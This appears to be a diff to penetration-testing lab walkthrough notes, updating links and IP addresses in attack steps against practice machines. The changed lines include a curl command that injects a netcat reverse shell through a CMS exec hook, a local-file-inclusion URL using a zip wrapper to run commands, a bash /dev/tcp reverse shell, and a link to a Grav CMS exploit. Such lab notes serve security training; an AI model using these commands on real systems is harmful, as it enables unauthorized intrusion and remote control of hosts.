@@ -426,6 +426,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
 3. Find Grav CMS and exploit for it. 
 ```
 https://www.exploit-db.com/exploits/49973
+https://github.com/CsEnox/CVE-2021-21425
 ```
 
 4. Run exploit after changing base64 of reverse shell
@@ -1607,7 +1608,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 
 b. Obtained reverse shell and local.txt
 ```
- curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.153 4449 -e /bin/sh' -b 'sid=foo' http://192.168.223.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
+ curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.153 4449 -e /bin/sh' -b 'sid=foo' http://192.168.220.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
 
 sudo nc -lvnp 4449
 listening on [any] 4449 ...
@@ -2007,9 +2008,9 @@ http://192.168.109.128/index.php?file=php://filter/convert.base64-encode/resourc
 
 http://192.168.109.128/uploads/upload_1627661999.zip
 
-http://192.168.109.128/index.php?file=zip://uploads/upload_1627661999.zip%23exploit&cmd=whoami
+http://192.168.109.128/index.php?file=zip://uploads/upload_1713347794.zip%23exploit&cmd=whoami
 
-bash -c 'bash -i >& /dev/tcp/192.168.118.4/443 0>&1'
+bash -c 'bash -i >& /dev/tcp/192.168.45.202/1234 0>&1'
 
 cat /etc/crontab
 
